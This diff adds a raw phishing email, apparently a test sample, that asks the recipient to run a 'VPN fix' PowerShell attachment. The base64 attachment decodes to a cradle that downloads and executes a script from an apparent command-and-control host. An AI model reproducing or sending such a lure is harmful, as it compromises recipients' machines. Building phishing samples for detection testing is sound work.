@@ -1,0 +1,24 @@
+From: "Network Engineering" <ops@network-diagnostics-portal.com>
+To: victim@company.com
+Subject: Run Network Connectivity Diagnostic Script
+Return-Path: <ops@network-diagnostics-portal.com>
+Reply-To: <ops@network-diagnostics-portal.com>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-26-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=none dkim=none dmarc=none
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============BOUNDARY_PHISH_73_26=="
+
+--===============BOUNDARY_PHISH_73_26==
+Content-Type: text/html; charset=utf-8
+
+Please execute the attached PowerShell diagnostic script to resolve intermittent VPN dropouts.
+
+--===============BOUNDARY_PHISH_73_26==
+Content-Type: text/plain; name="FixVPNDropouts.ps1"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="FixVPNDropouts.ps1"
+
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7IElFWCgkY2xpZW50LkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkYzIub3JnL2FnZW50LnBzMScpKQ==
+
+--===============BOUNDARY_PHISH_73_26==--
